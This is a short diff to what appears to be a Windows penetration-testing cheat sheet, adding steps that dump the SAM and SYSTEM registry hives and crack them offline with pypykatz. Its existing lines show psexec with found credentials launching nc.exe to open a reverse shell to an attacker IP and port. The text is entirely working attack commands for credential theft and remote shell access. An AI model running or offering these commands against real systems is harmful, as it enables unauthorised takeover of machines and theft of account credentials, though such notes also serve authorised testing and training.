@@ -152,4 +152,10 @@ net localgroup Administrators
 # psexec using found credentials
 # first upload nc.exe to a writable directory
 psexec.exe -u <username> -p <password> \\MACHINENAME C:\Inetpub\nc.exe <attackerip> <attackerport> -e C:\windows\system32\cmd.exe
+----------------------------------
+reg save hklm\sam c:\temp\sam.hive
+reg save hklm\system c:\temp\system.hive
+
+download sam and system file attack machine
+kali : pypykatz registry --sam sam.hive system.hive
 
